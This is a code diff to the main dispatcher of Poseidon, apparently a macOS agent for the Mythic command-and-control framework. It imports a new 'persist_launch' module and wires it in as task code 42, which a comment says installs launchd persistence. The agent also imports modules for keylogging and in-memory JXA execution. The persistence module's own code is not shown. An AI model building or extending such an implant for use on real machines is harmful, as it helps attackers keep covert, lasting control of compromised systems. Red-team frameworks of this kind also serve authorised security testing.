@@ -21,6 +21,8 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_memory"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keys"
@@ -47,9 +49,8 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unsetenv"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
 )
+import "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launch"
 
 const (
 	NONE_CODE = 100
@@ -204,6 +205,7 @@ func main() {
 		"execute_memory":    39,
 		"jsimport":          40,
 		"jsimport_call":     41,
+		"persist_launch":    42,
 		"none":              NONE_CODE,
 	}
 
@@ -607,16 +609,20 @@ func main() {
 					//log.Println("Added to backgroundTasks with file id: ", fileDetails.FileID)
 					//go profile.GetFile(task.Tasks[j], fileDetails, backgroundTasks[fileDetails.FileID])
 					break
-                case 40:
+				case 40:
 					// File upload for jsimport
 					var jsonArgs map[string]interface{}
 					json.Unmarshal([]byte(task.Tasks[j].Params), &jsonArgs)
 					backgroundTasks[jsonArgs["file_id"].(string)] = make(chan []byte)
 					go jsimport.Run(task.Tasks[j], backgroundTasks[jsonArgs["file_id"].(string)], profile.GetFile, &imported_script)
 					break
-                case 41:
+				case 41:
 					//Execute jxa code in memory from the script imported by jsimport
 					go jsimport_call.Run(task.Tasks[j], imported_script)
+					break
+				case 42:
+					//Execute persist_launch command to install launchd persistence
+					go persist_launch.Run(task.Tasks[j])
 					break
 				case NONE_CODE:
 					// No tasks, do nothing
